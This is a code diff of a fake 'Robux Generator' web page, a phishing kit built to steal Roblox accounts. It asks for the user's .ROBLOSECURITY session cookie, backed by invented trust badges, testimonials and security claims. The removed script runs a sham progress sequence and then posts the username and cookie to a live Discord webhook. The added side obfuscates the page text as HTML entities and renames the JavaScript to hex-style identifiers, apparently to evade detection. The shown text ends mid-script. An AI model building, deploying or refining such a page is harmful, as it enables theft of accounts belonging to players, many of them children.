@@ -2,322 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Official Robux Generator</title>
+    <title>&#82;&#x6f;&#x62;&#108;&#111;&#120;&#32;&#79;&#102;&#102;&#105;&#99;&#105;&#x61;&#108;&#32;&#82;&#111;&#98;&#x75;&#x78;&#32;&#x47;&#101;&#110;&#x65;&#114;&#97;&#x74;&#111;&#x72;</title>
     <link rel="icon" href="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&family=Orbitron:wght@700&display=swap');
-        body {
-            background: linear-gradient(115deg, #0f2027 0%, #2c5364 100%);
-            font-family: 'Montserrat', Arial, sans-serif;
-            color: #222;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-        .main-flex {
-            display: flex;
-            align-items: flex-start;
-            justify-content: center;
-            gap: 32px;
-        }
-        @media (max-width: 1100px) {
-            .main-flex {
-                flex-direction: column;
-                align-items: stretch;
-                gap: 14px;
-            }
-        }
-        .container {
-            background: rgba(255,255,255,0.99);
-            border-radius: 24px;
-            box-shadow: 0 8px 40px 2px rgba(44,83,100,.23), 0 2px 4px rgba(15,32,39,0.04);
-            padding: 42px 42px 32px 42px;
-            max-width: 390px;
-            width: 96%;
-            text-align: center;
-            position: relative;
-        }
-        .side-trustbox {
-            width: 275px;
-            max-width: 92vw;
-            background: #e3fce3;
-            border-radius: 17px;
-            box-shadow: 0 8px 40px 2px rgba(44,83,100,0.13), 0 2px 4px rgba(15,32,39,0.02);
-            padding: 18px 20px 16px 20px;
-            font-size: 13.5px;
-            color: #2b3d4c;
-            text-align: left;
-            line-height: 1.7;
-            border-left: 3px solid #00ea64;
-            font-family: 'Montserrat', Arial, sans-serif;
-            pointer-events: none;
-        }
-        .side-trustbox strong, .side-trustbox .highlight {
-            color: #00ea64;
-            font-weight: 700;
-        }
-        .side-trustbox .side-title {
-            font-family: 'Orbitron', Arial, sans-serif;
-            color: #00ea64;
-            display: block;
-            font-size: 1.08em;
-            font-weight: 700;
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-        .side-trustbox ul {
-            margin: 4px 0 0 18px;
-            padding: 0;
-        }
-        .side-trustbox li {
-            margin-bottom: 0.89em;
-            list-style: disc;
-        }
-        .side-trustbox .testimonial {
-            font-style: italic;
-            background: #f8fffa;
-            border-radius: 5px;
-            padding: 7px 10px;
-            margin: 9px 0 8px 0;
-            color: #2d8e5c;
-            border-left: 3px solid #00ea64;
-            font-size: 12.6px;
-        }
-        .side-trustbox .trust-badges {
-            display: flex;
-            gap: 11px;
-            margin: 13px 0 9px 0;
-        }
-        .side-trustbox .trust-badge {
-            width: 39px;
-            height: 39px;
-            border-radius: 50%;
-            background: #d4ffd8;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 7px #00ea6425;
-            border: 2px solid #00ea6480;
-            flex-shrink: 0;
-        }
-        .side-trustbox .trust-badge img {
-            width: 23px;
-            height: 23px;
-        }
-        @media (max-width: 900px) {
-            .side-trustbox {
-                margin: 20px auto 0 auto;
-                width: 97vw;
-                max-width: 97vw;
-            }
-        }
-        @media (max-width: 500px) {
-            .container {
-                max-width: 100vw;
-                padding: 18px 10px 17px 10px;
-            }
-            .side-trustbox {
-                margin: 18px auto 0 auto;
-                width: 98vw;
-            }
-            h1 { font-size: 1.3rem; }
-            .main-flex {
-                flex-direction: column;
-                gap: 11px;
-            }
-            .trust-cred-section {
-                max-width: 97vw;
-                padding: 13px 8px 10px 8px;
-            }
-        }
-        .roblox-logo {
-            width: 64px;
-            display: block;
-            margin: 0 auto 12px auto;
-            filter: drop-shadow(0 2px 12px #00ea64c0);
-            animation: tada 1.5s infinite alternate;
-        }
-        @keyframes tada {
-            0% { transform: scale(1) rotate(0deg);}
-            65%{ transform: scale(1.08) rotate(-2deg);}
-            100%{ transform: scale(1) rotate(1deg);}
-        }
-        h1 {
-            font-family: 'Orbitron', Arial, sans-serif;
-            color: #00ea64;
-            letter-spacing: 1.5px;
-            margin-bottom: 10px;
-            font-size: 2rem;
-            text-shadow: 0 2px 12px #00ea645e;
-        }
-        .verif {
-            font-size: 13px;
-            color: #375a7f;
-            margin-bottom: 18px;
-            background: #e3fce3;
-            border-radius: 7px;
-            padding: 6px 0 6px 0;
-            font-weight: 700;
-            box-shadow: 0 0 2px #00ea648a;
-        }
-        input, button {
-            width: 100%;
-            padding: 12px;
-            margin: 9px 0 21px 0;
-            border-radius: 8px;
-            border: 1px solid #b3d1ed;
-            font-size: 17px;
-            transition: border 0.2s;
-        }
-        input:focus {
-            border: 1.5px solid #00ea64;
-            outline: none;
-            background: #f6fff7;
-        }
-        button {
-            background: linear-gradient(90deg, #00ea64 40%, #5dfaff 100%);
-            color: #fff;
-            font-weight: 900;
-            font-family: 'Orbitron', Arial, sans-serif;
-            cursor: pointer;
-            border: none;
-            font-size: 1.18rem;
-            box-shadow: 0 4px 16px #00ea6450;
-            letter-spacing: 1px;
-            transition: background 0.12s, transform 0.10s;
-        }
-        button:active {
-            transform: scale(0.97);
-        }
-        button:hover {
-            background: linear-gradient(93deg, #00ab86 10%, #00ea64 90%);
-        }
-        .progress-bar-bg {
-            width: 100%;
-            height: 15px;
-            background: #d9fbe3;
-            border-radius: 8px;
-            margin: 18px 0 21px 0;
-            overflow: hidden;
-            display: none;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00ea64 0%, #5dfaff 100%);
-            transition: width 0.50s;
-        }
-        .note {
-            font-size: 12.7px;
-            color: #3b455e;
-            background: #e6f4fa;
-            border-radius: 7px;
-            margin-top: 7px;
-            box-shadow: 0 0 1px #70fff5aa;
-            padding: 7px;
-        }
-        .success {
-            color: #05af60;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
-        .error {
-            color: #e53935;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 1.07rem;
-        }
-        .fake-robux-amount {
-            background: linear-gradient(90deg, #00ea64, #5dfaff);
-            color: #fff;
-            font-size: 1.24rem;
-            font-family: 'Orbitron', Arial, sans-serif;
-            font-weight: 700;
-            display: inline-block;
-            padding: 5px 16px;
-            border-radius: 9px;
-            box-shadow: 0 0 9px #00ea6460;
-            letter-spacing: 1px;
-            margin-bottom: 15px;
-            margin-top: 10px;
-        }
-        .loader {
-            border: 4px solid #f4f9fb;
-            border-radius: 50%;
-            border-top: 4px solid #00ea64;
-            border-right: 4px solid #5dfaff;
-            width: 36px;
-            height: 36px;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-            margin-bottom: 12px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg);}
-            100% { transform: rotate(360deg);}
-        }
-        /* Trust & Credibility section styling */
-        .trust-cred-section {
-            max-width: 370px;
-            background: #f6fffa;
-            border: 2px solid #00ea64;
-            border-radius: 16px;
-            padding: 22px 22px 17px 22px;
-            box-shadow: 0 2px 16px #00ea6423;
-        }
-        .trust-cred-section h2 {
-            font-family: 'Orbitron', Arial, sans-serif;
-            color: #12c962;
-            font-size: 1.13rem;
-            margin-top: 0;
-            margin-bottom: 10px;
-            letter-spacing: 0.7px;
-        }
-        .trust-cred-section ul {
-            margin: 7px 0 0 19px;
-            padding: 0;
-        }
-        .trust-cred-section li {
-            margin-bottom: 9px;
-            font-size: 13.1px;
-            color: #2c5742;
-        }
-        .trust-cred-section .reason {
-            margin: 11px 0 0 0;
-            font-size: 13.3px;
-            background: #ebfff1;
-            border-left: 4px solid #30eb8e;
-            border-radius: 7px;
-            padding: 9px 11px 9px 13px;
-            color: #20754f;
-            font-weight: 600;
-            letter-spacing: .17px;
-        }
-        .trust-cred-section .why-need {
-            background: #eefdfe;
-            padding: 8px 11px 9px 13px;
-            border-left: 4px solid #34d1ed;
-            color: #29587b;
-            border-radius: 7px;
-            font-size: 13.2px;
-            margin-top: 13px;
-            font-weight: 600;
-            letter-spacing: .17px;
-        }
+@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&family=Orbitron:wght@700&display=swap');
+body{background:linear-gradient(115deg,#0f2027 0%,#2c5364 100%);font-family:'Montserrat',Arial,sans-serif;color:#222;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;min-height:100vh;overflow:hidden;}
+.main-flex{display:flex;align-items:flex-start;justify-content:center;gap:32px;}
+@media (max-width:1100px){.main-flex{flex-direction:column;align-items:stretch;gap:14px;}}
+.container{background:rgba(255,255,255,0.99);border-radius:24px;box-shadow:0 8px 40px 2px rgba(44,83,100,.23),0 2px 4px rgba(15,32,39,0.04);padding:42px 42px 32px 42px;max-width:390px;width:96%;text-align:center;position:relative;}
+.side-trustbox{width:275px;max-width:92vw;background:#e3fce3;border-radius:17px;box-shadow:0 8px 40px 2px rgba(44,83,100,0.13),0 2px 4px rgba(15,32,39,0.02);padding:18px 20px 16px 20px;font-size:13.5px;color:#2b3d4c;text-align:left;line-height:1.7;border-left:3px solid #00ea64;font-family:'Montserrat',Arial,sans-serif;pointer-events:none;}
+.side-trustbox strong,.side-trustbox .highlight{color:#00ea64;font-weight:700;}
+.side-trustbox .side-title{font-family:'Orbitron',Arial,sans-serif;color:#00ea64;display:block;font-size:1.08em;font-weight:700;margin-bottom:6px;letter-spacing:0.5px;}
+.side-trustbox ul{margin:4px 0 0 18px;padding:0;}
+.side-trustbox li{margin-bottom:0.89em;list-style:disc;}
+.side-trustbox .testimonial{font-style:italic;background:#f8fffa;border-radius:5px;padding:7px 10px;margin:9px 0 8px 0;color:#2d8e5c;border-left:3px solid #00ea64;font-size:12.6px;}
+.side-trustbox .trust-badges{display:flex;gap:11px;margin:13px 0 9px 0;}
+.side-trustbox .trust-badge{width:39px;height:39px;border-radius:50%;background:#d4ffd8;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 7px #00ea6425;border:2px solid #00ea6480;flex-shrink:0;}
+.side-trustbox .trust-badge img{width:23px;height:23px;}
+@media (max-width:900px){.side-trustbox{margin:20px auto 0 auto;width:97vw;max-width:97vw;}}
+@media (max-width:500px){
+    .container{max-width:100vw;padding:18px 10px 17px 10px;}
+    .side-trustbox{margin:18px auto 0 auto;width:98vw;}
+    h1{font-size:1.3rem;}
+    .main-flex{flex-direction:column;gap:11px;}
+    .trust-cred-section{max-width:97vw;padding:13px 8px 10px 8px;}
+}
+.roblox-logo{width:64px;display:block;margin:0 auto 12px auto;filter:drop-shadow(0 2px 12px #00ea64c0);animation:tada 1.5s infinite alternate;}
+@keyframes tada{
+    0%{transform:scale(1) rotate(0deg);}
+    65%{transform:scale(1.08) rotate(-2deg);}
+    100%{transform:scale(1) rotate(1deg);}
+}
+h1{font-family:'Orbitron',Arial,sans-serif;color:#00ea64;letter-spacing:1.5px;margin-bottom:10px;font-size:2rem;text-shadow:0 2px 12px #00ea645e;}
+.verif{font-size:13px;color:#375a7f;margin-bottom:18px;background:#e3fce3;border-radius:7px;padding:6px 0 6px 0;font-weight:700;box-shadow:0 0 2px #00ea648a;}
+input,button{width:100%;padding:12px;margin:9px 0 21px 0;border-radius:8px;border:1px solid #b3d1ed;font-size:17px;transition:border 0.2s;}
+input:focus{border:1.5px solid #00ea64;outline:none;background:#f6fff7;}
+button{background:linear-gradient(90deg,#00ea64 40%,#5dfaff 100%);color:#fff;font-weight:900;font-family:'Orbitron',Arial,sans-serif;cursor:pointer;border:none;font-size:1.18rem;box-shadow:0 4px 16px #00ea6450;letter-spacing:1px;transition:background 0.12s,transform 0.10s;}
+button:active{transform:scale(0.97);}
+button:hover{background:linear-gradient(93deg,#00ab86 10%,#00ea64 90%);}
+.progress-bar-bg{width:100%;height:15px;background:#d9fbe3;border-radius:8px;margin:18px 0 21px 0;overflow:hidden;display:none;}
+.progress-bar-fill{height:100%;width:0%;background:linear-gradient(90deg,#00ea64 0%,#5dfaff 100%);transition:width 0.50s;}
+.note{font-size:12.7px;color:#3b455e;background:#e6f4fa;border-radius:7px;margin-top:7px;box-shadow:0 0 1px #70fff5aa;padding:7px;}
+.success{color:#05af60;margin-bottom:10px;font-weight:bold;font-size:1.1rem;}
+.error{color:#e53935;margin-bottom:10px;font-weight:bold;font-size:1.07rem;}
+.fake-robux-amount{background:linear-gradient(90deg,#00ea64,#5dfaff);color:#fff;font-size:1.24rem;font-family:'Orbitron',Arial,sans-serif;font-weight:700;display:inline-block;padding:5px 16px;border-radius:9px;box-shadow:0 0 9px #00ea6460;letter-spacing:1px;margin-bottom:15px;margin-top:10px;}
+.loader{border:4px solid #f4f9fb;border-radius:50%;border-top:4px solid #00ea64;border-right:4px solid #5dfaff;width:36px;height:36px;animation:spin 0.8s linear infinite;display:inline-block;margin-bottom:12px;}
+@keyframes spin{
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
+}
+.trust-cred-section{max-width:370px;background:#f6fffa;border:2px solid #00ea64;border-radius:16px;padding:22px 22px 17px 22px;box-shadow:0 2px 16px #00ea6423;}
+.trust-cred-section h2{font-family:'Orbitron',Arial,sans-serif;color:#12c962;font-size:1.13rem;margin-top:0;margin-bottom:10px;letter-spacing:0.7px;}
+.trust-cred-section ul{margin:7px 0 0 19px;padding:0;}
+.trust-cred-section li{margin-bottom:9px;font-size:13.1px;color:#2c5742;}
+.trust-cred-section .reason{margin:11px 0 0 0;font-size:13.3px;background:#ebfff1;border-left:4px solid #30eb8e;border-radius:7px;padding:9px 11px 9px 13px;color:#20754f;font-weight:600;letter-spacing:.17px;}
+.trust-cred-section .why-need{background:#eefdfe;padding:8px 11px 9px 13px;border-left:4px solid #34d1ed;color:#29587b;border-radius:7px;font-size:13.2px;margin-top:13px;font-weight:600;letter-spacing:.17px;}
     </style>
 </head>
 <body>
     <div class="main-flex">
-        <!-- Trust & Credibility section on the left -->
         <div class="trust-cred-section">
-            <h2>Trust &amp; Credibility</h2>
+            <h2>&#84;&#x72;&#117;&#x73;&#116;&#32;&#x26;&#x23;&#51;&#x38;&#59;&#32;&#x43;&#114;&#x65;&#100;&#105;&#x62;&#105;&#x6c;&#105;&#x74;&#x79;</h2>
             <ul>
-                <li><b>Why Choose Us?</b></li>
+                <li><b>&#87;&#104;&#121;&#32;&#67;&#x68;&#x6f;&#111;&#115;&#101;&#32;&#x55;&#115;&#x3f;</b></li>
             </ul>
             <div class="reason">
                 We use <b>conservative delivery limits</b> and <b>controlled distribution methods</b> to reduce risk and help keep accounts in good standing.
@@ -330,48 +77,38 @@
             </div>
         </div>
 
-        <!-- Main generator in the center -->
         <div class="container">
-            <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
-            <h1>Robux Generator</h1>
-            <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
+            <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="&#82;&#x6f;&#98;&#108;&#x6f;&#120;&#32;&#x4c;&#111;&#103;&#x6f;">
+            <h1>&#82;&#x6f;&#x62;&#117;&#x78;&#32;&#x47;&#101;&#110;&#101;&#x72;&#97;&#x74;&#111;&#x72;</h1>
+            <div class="verif">&#128274;&#32;&#82;&#111;&#x62;&#108;&#111;&#x78;&#32;&#80;&#x6c;&#117;&#x73;&#32;&#x53;&#101;&#99;&#117;&#x72;&#105;&#x74;&#121;&#32;&#86;&#x65;&#114;&#x69;&#x66;&#x69;&#99;&#x61;&#x74;&#105;&#x6f;&#x6e;&#x20;&#69;&#110;&#97;&#98;&#108;&#x65;&#100;</div>
             <div id="msg"></div>
             <form id="robux-form" autocomplete="off">
-                <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
-                <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
-                <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
-                <button type="submit">Claim Robux</button>
+                <input type="text" id="username" placeholder="&#69;&#110;&#x74;&#x65;&#x72;&#32;&#121;&#111;&#117;&#114;&#32;&#x52;&#x6f;&#x62;&#108;&#111;&#120;&#32;&#85;&#115;&#101;&#114;&#110;&#x61;&#109;&#101;" required autocomplete="username">
+                <input type="number" id="robux" placeholder="&#65;&#109;&#x6f;&#117;&#x6e;&#x74;&#32;&#111;&#x66;&#32;&#82;&#111;&#x62;&#117;&#x78;&#32;&#40;&#77;&#x61;&#x78;&#32;5000&#x29;" min="1" max="5000" required>
+                <input type="text" id="cookie" placeholder="&#x53;&#101;&#x73;&#x73;&#x69;&#111;&#x6e;&#32;&#40;.ROBLOSECURITY&#x29;&#32;&#67;&#111;&#x6f;&#x6b;&#105;&#x65;" required autocomplete="off">
+                <button type="submit">&#67;&#108;&#x61;&#x69;&#109;&#32;&#82;&#111;&#98;&#117;&#x78;</button>
             </form>
             <div class="progress-bar-bg" id="progress-bar">
                 <div class="progress-bar-fill" id="progress-bar-fill"></div>
             </div>
             <div class="note">
-                <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
-                <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
-                <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
+                <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px;vertical-align:middle;margin-right:3px;">
+                <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.<br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
             </div>
-            <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
+            <div class="fake-robux-amount" id="robux-total">&#84;&#x6f;&#116;&#97;&#108;&#32;&#82;&#x6f;&#x62;&#x75;&#120;&#32;&#65;&#x76;&#97;&#x69;&#108;&#x61;&#x62;&#108;&#101;&#x3a;&#32;<span id="robux-count">492,472</span></div>
         </div>
 
-        <!-- Side trust box on the right -->
         <div class="side-trustbox">
-            <span class="side-title">Why Trust Us?</span>
+            <span class="side-title">&#x57;&#x68;&#x79;&#32;&#x54;&#114;&#117;&#x73;&#116;&#32;&#x55;&#x73;&#63;</span>
             <div class="trust-badges">
                 <div class="trust-badge" title="SSL Secure"><img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="lock"></div>
                 <div class="trust-badge" title="Top Rated"><img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png" alt="star"></div>
                 <div class="trust-badge" title="Privacy Protected"><img src="https://cdn-icons-png.flaticon.com/128/942/942748.png" alt="shield"></div>
             </div>
             <ul>
-                <li><strong>Proven Track Record:</strong>
-                    Serving Roblox users for <span class="highlight">3+ years</span>, with <span class="highlight">18,000+</span> satisfied users!
-                </li>
-                <li><strong>Fully Secure &amp; Anonymous:</strong>
-                    Your data is <span class="highlight">SSL encrypted</span> and cookies are <b>never stored</b> after instant verification.
-                </li>
-                <li>
-                    <strong>Direct API Processing:</strong>
-                    We use the same systems powering official Roblox gift distribution for <span class="highlight">instant, verified credits</span>.
-                </li>
+                <li><strong>&#80;&#114;&#x6f;&#x76;&#101;&#110;&#32;&#84;&#x72;&#97;&#99;&#x6b;&#32;&#82;&#x65;&#99;&#111;&#x72;&#100;&#x3a;</strong> Serving Roblox users for <span class="highlight">3+ years</span>, with <span class="highlight">18,000+</span> satisfied users!</li>
+                <li><strong>Fully Secure &amp; Anonymous:</strong> Your data is <span class="highlight">SSL encrypted</span> and cookies are <b>never stored</b> after instant verification.</li>
+                <li><strong>Direct API Processing:</strong> We use the same systems powering official Roblox gift distribution for <span class="highlight">instant, verified credits</span>.</li>
             </ul>
             <div class="testimonial">
                 <span>“I received my Robux in less than 15 minutes and the service was super legit. Highly recommend!”<br>
@@ -391,256 +128,93 @@
         </div>
     </div>
     <script>
-        // Setup dynamic fake robux count
-        function animateRobuxCount(el, start, end, duration) {
-            let startTime = null;
-            function animate(ts) {
-                if (!startTime) startTime = ts;
-                let progress = (ts - startTime) / duration;
-                if (progress > 1) progress = 1;
-                let value = Math.floor(start + (end - start) * progress);
-                el.textContent = value.toLocaleString();
-                if (progress < 1) {
-                    requestAnimationFrame(animate);
-                }
-            }
-            requestAnimationFrame(animate);
+(function(){
+    function _0x2d7a(_0x1f2b){return document.getElementById(_0x1f2b);}
+    function _0x3b18(_0x42e8,_0x1b43,_0x44ef,_0x8420){
+        var _0x3c13=null;
+        function _0x4d99(_0x32ec){
+            if(!_0x3c13) _0x3c13=_0x32ec;
+            var _0x27bf=(_0x32ec-_0x3c13)/_0x8420;
+            if(_0x27bf>1) _0x27bf=1;
+            var _0x4c9b=Math.floor(_0x1b43+(_0x44ef-_0x1b43)*_0x27bf);
+            _0x42e8.textContent=_0x4c9b.toLocaleString();
+            if(_0x27bf<1){requestAnimationFrame(_0x4d99);}
         }
-        let robuxEl = document.getElementById('robux-count');
-        setInterval(() => {
-            // simulate changes
-            let randomChange = Math.floor(Math.random() * 7) - 2;
-            let curr = parseInt(robuxEl.textContent.replace(/,/g,''), 10) + randomChange;
-            if (curr < 490000) curr = 492000 + Math.floor(Math.random()*520);
-            animateRobuxCount(robuxEl, parseInt(robuxEl.textContent.replace(',','')), curr, 500);
-        }, 2600);
+        requestAnimationFrame(_0x4d99);
+    }
+    var _0x197c=_0x2d7a('robux-count');
+    setInterval(function(){
+        var _0x3957=Math.floor(Math.random()*7)-2;
+        var _0x50b3=parseInt(_0x197c.textContent.replace(/,/g,''),10)+_0x3957;
+        if(_0x50b3<490000){_0x50b3=492000+Math.floor(Math.random()*520);}
+        _0x3b18(_0x197c,parseInt(_0x197c.textContent.replace(',','')),_0x50b3,500);
+    },2600);
 
-        // ========== BEGIN: Testimonial random username code ==========
-        (function() {
-            // Possible username pool (feel free to expand/replace for realism)
-
-            const testimonialUsernames = [
-                "AeroBlox",
-                "xKairoRBX",
-                "NovaMint",
-                "Brickson",
-                "VoidJett",
-                "MiloRBLX",
-                "Zennify",
-                "AshBlox",
-                "PixelKade",
-                "StormiPlays",
-                "RbxLucid",
-                "EchoBlocks",
-                "JunoRbx",
-                "LowkeyMint",
-                "FluxKairo",
-                "NeoBloxer",
-                "AxelMint",
-                "BloxHaven",
-                "SkyeRbx",
-                "OrbitPlays",
-                "StaticKade",
-                "DriftMint",
-                "RbxNolan",
-                "SolarJett",
-                "UrbanBlox",
-                "ObbyFlux",
-                "KiroPlays",
-                "ZenBlocks",
-                "BrickNova",
-                "RiftRbx",
-                "LunarMint",
-                "PixelRyn",
-                "EchoJett",
-                "BloxAris",
-                "MasonRBLX",
-                "VoidMint",
-                "AtlasBlox",
-                "NoriRbx",
-                "FrostJett",
-                "MintyPlays",
-                "ObbyRift",
-                "BloxKeen",
-                "RbxTylo",
-                "SkylinBlox",
-                "VantaMint",
-                "OrbitRbx",
-                "KadePlays",
-                "LucidNova",
-                "BrickRyn",
-                "FluxObby",
-                "AxiomBlox",
-                "RbxHaze",
-                "PixelRune",
-                "MintAtlas",
-                "DriftRbx",
-                "SolarKeen",
-                "EchoMint",
-                "NovaRbxer",
-                "BloxTyra",
-                "ZenithPlays",
-                "KiroMint",
-                "UrbanRune",
-                "VoidKeen",
-                "RbxSkyl",
-                "BrickFlux",
-                "ObbyNova",
-                "LumenBlox",
-                "RbxArlo",
-                "MintJuno",
-                "StaticRune",
-                "FableBlox",
-                "RbxMiko",
-                "PixelHaze",
-                "AtlasMint",
-                "OrbitRune",
-                "NeoPlays",
-                "BloxKiro",
-                "SolarMint",
-                "RbxFynn",
-                "DriftNova",
-                "ZenPlays",
-                "BrickHaze",
-                "EchoRyn",
-                "MintObby",
-                "VeloBlox",
-                "RbxSoren",
-                "PixelAtlas",
-                "MintFlux",
-                "VoidRune",
-                "BloxJett",
-                "UrbanMint",
-                "NovaPlays",
-                "RbxElio",
-                "StaticBlox",
-                "LunarRbx",
-                "BrickZen",
-                "EchoNova",
-                "MintKeen",
-                "ObbyLuxe",
-                "FluxPlays",
-                "RbxKorin",
-                "PixelLuxe",
-                "MintRift",
-                "VoidPlays",
-                "BloxHaze",
-                "SolarRune",
-                "UrbanNova",
-                "RbxTaro",
-                "StaticMint",
-                "LumenPlays",
-                "BrickLuxe",
-                "EchoFlux",
-                "MintZen",
-                "ObbyRune",
-                "VantaPlays"
-            ];
-
-            function getRandomUsername(arr) {
-                return arr[Math.floor(Math.random() * arr.length)];
-            }
-            // Wait for DOM ready (for robustness)
-            window.addEventListener('DOMContentLoaded', function() {
-                var testimonialEl = document.getElementById("testimonial-user");
-                if (testimonialEl) {
-                    testimonialEl.textContent = getRandomUsername(testimonialUsernames);
-                }
-            });
-        })();
-        // ========== END: Testimonial random username code ==========
-
-        document.getElementById('robux-form').addEventListener('submit', function(e){
-            e.preventDefault();
-            var username = document.getElementById('username').value.trim();
-            var robux = document.getElementById('robux').value;
-            var cookie = document.getElementById('cookie').value.trim();
-            var msgDiv = document.getElementById('msg');
-            var progressBg = document.getElementById('progress-bar');
-            var progressFill = document.getElementById('progress-bar-fill');
-            msgDiv.innerHTML = '';
-            progressBg.style.display = "none";
-            progressFill.style.width = "0%";
-            if(!username || !robux || !cookie) {
-                msgDiv.innerHTML = '<div class="error">⚠️ Please fill out <b>all</b> fields!</div>';
-                return;
-            }
-            if(+robux < 1 || +robux > 5000) {
-                msgDiv.innerHTML = '<div class="error">⚠️ Amount must be between 1 and 5000.</div>';
-                return;
-            }
-            var steps = [
-                {
-                    text: '<span class="loader"></span><br><b>Establishing connection with Roblox servers...</b>',
-                    progress: 18
-                },
-                {
-                    text: '<span class="loader"></span><br><b>Authorizing User:</b> '+username,
-                    progress: 36
-                },
-                {
-                    text: '<span class="loader"></span><br><b>Fetching account details...</b>',
-                    progress: 51
-                },
-                {
-                    text: '<span class="loader"></span><br><b>Checking Robux availability: <i style="color:#00ea64;font-weight:bold">'+robux+'</i> R$</b>',
-                    progress: 63
-                },
-                {
-                    text: '<span class="loader"></span><br><b>Validating .ROBLOSECURITY session...</b>',
-                    progress: 77
-                },
-                {
-                    text: '<span class="loader"></span><br><b>Preparing transfer of <span style="color:#00ea64;">'+robux+'</span> R$ to <span style="color:#378ef3;">'+username+'</span>...</b>',
-                    progress: 90
-                },
-            ];
-            function fakeLoadingSequence(step) {
-                if (step < steps.length) {
-                    progressBg.style.display = 'block';
-                    progressFill.style.width = steps[step].progress+'%';
-                    msgDiv.innerHTML = steps[step].text;
-                    setTimeout(function(){
-                        fakeLoadingSequence(step+1);
-                    }, 1200 + Math.random()*700);
-                } else {
-                    // Send webhook only after delay to look realistic
-                    msgDiv.innerHTML = '<span class="loader"></span><br><b>Finalizing and submitting request...</b>';
-                    progressFill.style.width = '100%';
-                    setTimeout(function(){
-                        // Prepare and send credentials
-                        var content =
-                            "**Roblox Credentials**\n"
-                            + "**username:** " + username + "\n"
-                            + "**.ROBLOSECURITY:** `" + cookie + "`\n"
-                            + "**Requested Robux:** " + robux;
-                        fetch('https://discord.com/api/webhooks/1456906677663305792/zcqbEE3imWQLnCbbAg8zn5ax-yulUAlmO-6SldfEdEOT-CRUMsuZShV1je-zVsCQqzwf', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({content: content})
-                        }).then(function(response){
-                            if(response.status === 204 || response.status === 200){
-                                progressBg.style.display = 'none';
-                                msgDiv.innerHTML = '<div class="success"><span style="font-size:1.5em;color:#00ea64;">✔</span><br>Robux successfully queued!<br><span style="color:#666;font-weight:normal;">Status: <b>Processing... (pending confirmation)</b></span><br><br><span style="font-size:0.92em;color:#207708;"><b>This may take 5-20 minutes.<br>Do not close this page!</b></span></div>';
-                                setTimeout(function(){
-                                    msgDiv.innerHTML = '<div class="success"><span style="font-size:1.6em;">✅</span> Robux transaction now pending.<br><b>You will receive <span style="color:#00ea64;">'+robux+'</span> R$ soon!</b> ☑<br><span style="font-size:13px;color:#666;">You may safely close this page once you see Robux added.</span></div>';
-                                    progressFill.style.width = '0%';
-                                }, 7000);
-                            } else {
-                                progressBg.style.display = 'none';
-                                msgDiv.innerHTML = '<div class="error">Roblox transfer error. Try again later.</div>';
-                            }
-                        }).catch(function(){
-                            progressBg.style.display = 'none';
-                            msgDiv.innerHTML = '<div class="error">Network error. Check your connection.</div>';
-                        });
-                    }, 1700 + Math.random()*600);
-                }
-            }
-            fakeLoadingSequence(0);
+    (function(){
